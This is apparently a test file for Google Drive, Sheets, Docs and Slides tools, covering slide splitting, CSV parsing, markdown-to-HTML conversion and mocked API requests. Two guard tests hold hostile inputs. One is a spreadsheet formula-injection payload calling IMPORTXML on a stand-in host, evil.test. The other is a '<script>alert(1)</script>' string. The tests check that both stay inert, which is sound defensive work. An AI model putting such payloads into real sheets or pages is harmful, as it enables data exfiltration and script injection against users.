import { afterEach, beforeEach, describe, expect, it } from "bun:test"
import {
  createDriveTools,
  markdownToHtml,
  parseMarkdownSlides,
  parseTableContent,
} from "./google-drive-def.js"

const originalFetch = globalThis.fetch
let requests: { url: string; method: string; body: string }[] = []

function executeTool(name: string, args: Record<string, unknown>) {
  const tools = createDriveTools({
    userId: "user_1",
    getAccessToken: async () => "drive-token",
  })
  const tool = tools[name] as { execute: (args: Record<string, unknown>) => Promise<unknown> }
  return tool.execute(args)
}

beforeEach(() => {
  requests = []
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input)
    let body = ""
    if (typeof init?.body === "string") body = init.body
    else if (init?.body instanceof Blob) body = await init.body.text()
    requests.push({ url, method: init?.method ?? "GET", body })

    if (url.includes("slides.googleapis.com") && url.includes("fields=slides.objectId")) {
      return Response.json({ slides: [{ objectId: "default_slide" }] })
    }
    if (url.includes("drive/v3/files") || url.includes("upload/drive/v3/files")) {
      return Response.json({
        id: "file_1",
        name: "created",
        webViewLink: "https://drive.google.com/file/d/file_1",
      })
    }
    return Response.json({})
  }) as typeof fetch
})

afterEach(() => {
  globalThis.fetch = originalFetch
})

describe("parseMarkdownSlides", () => {
  it("splits on --- separators with headings as titles", () => {
    const slides = parseMarkdownSlides(
      "# Intro\nWelcome\n\n---\n\n## Details\n- point one\n- point two\n\n---\n\nNo heading here\njust text",
    )
    expect(slides).toHaveLength(3)
    expect(slides[0]).toMatchObject({ title: "Intro", body: "Welcome" })
    expect(slides[1]?.title).toBe("Details")
    expect(slides[1]?.body).toContain("• point one")
    expect(slides[2]).toMatchObject({ title: "No heading here", body: "just text" })
  })

  it("falls back to splitting on top-level headings", () => {
    const slides = parseMarkdownSlides("# One\na\n# Two\nb")
    expect(slides.map((s) => s.title)).toEqual(["One", "Two"])
  })

  // A generated deck had text running off the bottom of the slide: the Slides API does
  // not re-run autofit on text it inserts, so an overlong body simply spills over the
  // edge instead of shrinking.
  it("splits an overlong section into a continuation slide", () => {
    const long = Array.from({ length: 20 }, (_, i) => `- bullet number ${i} with some text`).join(
      "\n",
    )
    const slides = parseMarkdownSlides(`# Comparison\n${long}`)

    expect(slides.length).toBeGreaterThan(1)
    expect(slides[0]?.title).toBe("Comparison")
    expect(slides[1]?.title).toBe("Comparison (cont.)")
    // Nothing may exceed what a placeholder can hold.
    for (const s of slides) {
      expect(s.body.split("\n").length).toBeLessThanOrEqual(9)
      expect(s.body.length).toBeLessThanOrEqual(520)
    }
  })

  it("leaves a slide that already fits alone", () => {
    const slides = parseMarkdownSlides("# Short\n- one\n- two\n- three")
    expect(slides).toHaveLength(1)
    expect(slides[0]?.title).toBe("Short")
  })
})

describe("parseTableContent", () => {
  it("parses CSV with quoted fields", () => {
    expect(parseTableContent('name,note\nAda,"loves, commas"\nBob,plain')).toEqual([
      ["name", "note"],
      ["Ada", "loves, commas"],
      ["Bob", "plain"],
    ])
  })

  it("prefers tabs when present", () => {
    expect(parseTableContent("a\tb\n1\t2")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ])
  })
})

describe("markdownToHtml", () => {
  it("renders headings, lists, emphasis, and links", () => {
    const html = markdownToHtml("# Title\nHello **world** with [a link](https://x.dev)\n- item")
    expect(html).toContain("<h1>Title</h1>")
    expect(html).toContain("<strong>world</strong>")
    expect(html).toContain('<a href="https://x.dev">a link</a>')
    expect(html).toContain("<ul><li>item</li></ul>")
  })

  it("escapes raw HTML in the source", () => {
    expect(markdownToHtml("<script>alert(1)</script>")).toContain("&lt;script&gt;")
  })
})

describe("drive-createFile", () => {
  it("builds a multi-slide deck and removes the default slide", async () => {
    const result = (await executeTool("drive-createFile", {
      name: "Deck",
      kind: "presentation",
      content: "# One\na\n\n---\n\n# Two\nb",
    })) as { id?: string; note?: string }

    expect(result.id).toBe("file_1")
    expect(result.note).toBeUndefined()

    const batch = requests.find((r) => r.url.includes(":batchUpdate"))
    expect(batch).toBeDefined()
    const { requests: slideRequests } = JSON.parse(batch!.body) as {
      requests: Record<string, unknown>[]
    }
    const creates = slideRequests.filter((r) => r["createSlide"])
    expect(creates).toHaveLength(2)
    const inserts = slideRequests.filter((r) => r["insertText"])
    expect(inserts.length).toBe(4) // title + body per slide
    expect(slideRequests.at(-1)).toEqual({ deleteObject: { objectId: "default_slide" } })
  })

  it("writes CSV content as a 2D range starting at A1", async () => {
    await executeTool("drive-createFile", {
      name: "Budget",
      kind: "spreadsheet",
      content: "item,cost\nrent,1200",
    })
    const put = requests.find((r) => r.url.includes("sheets.googleapis.com"))
    expect(put?.method).toBe("PUT")
    expect(put?.url).toContain("values/A1?valueInputOption=RAW")
    expect(JSON.parse(put!.body)).toEqual({
      values: [
        ["item", "cost"],
        ["rent", 1200],
      ],
    })
  })

  it("never sends spreadsheet cells with USER_ENTERED (formula-injection guard)", async () => {
    await executeTool("drive-createFile", {
      name: "Evil",
      kind: "spreadsheet",
      content: "label,value\nrent,=IMPORTXML(1)\ntotal,007",
    })
    const put = requests.find((r) => r.url.includes("sheets.googleapis.com"))
    expect(put?.url).toContain("valueInputOption=RAW")
    const { values } = JSON.parse(put!.body) as { values: (string | number)[][] }
    // Formula stays an inert string; leading-zero id stays a string, not 7.
    expect(values[1]).toEqual(["rent", "=IMPORTXML(1)"])
    expect(values[2]).toEqual(["total", "007"])
  })

  it("imports documents as HTML so markdown formatting survives", async () => {
    await executeTool("drive-createFile", {
      name: "Notes",
      kind: "document",
      content: "# Heading\nBody text",
    })
    const upload = requests.find((r) => r.url.includes("upload/drive/v3/files"))
    expect(upload?.body).toContain("Content-Type: text/html; charset=UTF-8")
    expect(upload?.body).toContain("<h1>Heading</h1>")
  })
})

describe("Sheets read and append", () => {
  it("reads a range, quoting the tab name", async () => {
    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
      requests.push({ url: String(input), method: init?.method ?? "GET", body: "" })
      return Response.json({ range: "Sheet1!A1:B2", values: [["item", "cost"], ["rent", "900"]] })
    }) as typeof fetch

    const res = (await executeTool("drive-readSheet", {
      spreadsheetId: "sheet_1",
      range: "A1:B2",
      sheetName: "Q3 Budget",
    })) as { rowCount: number; rows: string[][] }

    expect(res.rowCount).toBe(2)
    expect(res.rows[1]).toEqual(["rent", "900"])
    // Tab names with spaces must be single-quoted in the A1 reference.
    expect(decodeURIComponent(requests[0]!.url)).toContain("'Q3 Budget'!A1:B2")
  })

  it("appends rows without overwriting, using RAW and INSERT_ROWS", async () => {
    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
      requests.push({
        url: String(input),
        method: init?.method ?? "GET",
        body: typeof init?.body === "string" ? init.body : "",
      })
      return Response.json({ updates: { updatedRange: "Sheet1!A5:B5", updatedRows: 1 } })
    }) as typeof fetch

    const res = (await executeTool("drive-appendSheetRows", {
      spreadsheetId: "sheet_1",
      content: "coffee,4.50",
    })) as { ok: boolean; appendedRows: number }

    expect(res.ok).toBe(true)
    expect(res.appendedRows).toBe(1)
    const req = requests[0]!
    expect(req.method).toBe("POST")
    expect(req.url).toContain(":append")
    expect(req.url).toContain("valueInputOption=RAW")
    expect(req.url).toContain("insertDataOption=INSERT_ROWS")
    // Numeric cell coerced; text left alone.
    expect(JSON.parse(req.body)).toEqual({ values: [["coffee", 4.5]] })
  })

  it("never evaluates an appended formula (RAW, not USER_ENTERED)", async () => {
    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
      requests.push({
        url: String(input),
        method: init?.method ?? "GET",
        body: typeof init?.body === "string" ? init.body : "",
      })
      return Response.json({ updates: { updatedRows: 1 } })
    }) as typeof fetch

    await executeTool("drive-appendSheetRows", {
      spreadsheetId: "sheet_1",
      content: '"=IMPORTXML(""http://evil.test"",""//x"")",ok',
    })
    expect(requests[0]!.url).not.toContain("USER_ENTERED")
    const { values } = JSON.parse(requests[0]!.body) as { values: (string | number)[][] }
    expect(values[0]![0]).toBe('=IMPORTXML("http://evil.test","//x")')
    expect(values[0]![1]).toBe("ok")
  })
})

describe("Docs editing", () => {
  it("appends at the end of the body, one before the final index", async () => {
    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = String(input)
      requests.push({
        url,
        method: init?.method ?? "GET",
        body: typeof init?.body === "string" ? init.body : "",
      })
      if (url.includes("batchUpdate")) return Response.json({ replies: [] })
      return Response.json({ body: { content: [{ endIndex: 1 }, { endIndex: 42 }] } })
    }) as typeof fetch

    const res = (await executeTool("drive-appendToDoc", {
      documentId: "doc_1",
      text: "\nMeeting notes",
    })) as { ok: boolean }

    expect(res.ok).toBe(true)
    const batch = requests.find((r) => r.url.includes("batchUpdate"))!
    const { requests: reqs } = JSON.parse(batch.body) as {
      requests: { insertText: { location: { index: number }; text: string } }[]
    }
    // Docs rejects an insert at endIndex itself — it must land at endIndex - 1.
    expect(reqs[0]!.insertText.location.index).toBe(41)
    expect(reqs[0]!.insertText.text).toBe("\nMeeting notes")
  })

  it("reports zero occurrences when the find text is absent", async () => {
    globalThis.fetch = (async () =>
      Response.json({ replies: [{ replaceAllText: { occurrencesChanged: 0 } }] })) as typeof fetch

    const res = (await executeTool("drive-replaceInDoc", {
      documentId: "doc_1",
      find: "TBD",
      replaceWith: "Done",
      matchCase: true,
    })) as { occurrencesChanged: number; message: string }

    expect(res.occurrencesChanged).toBe(0)
    expect(res.message).toContain("not found")
  })
})
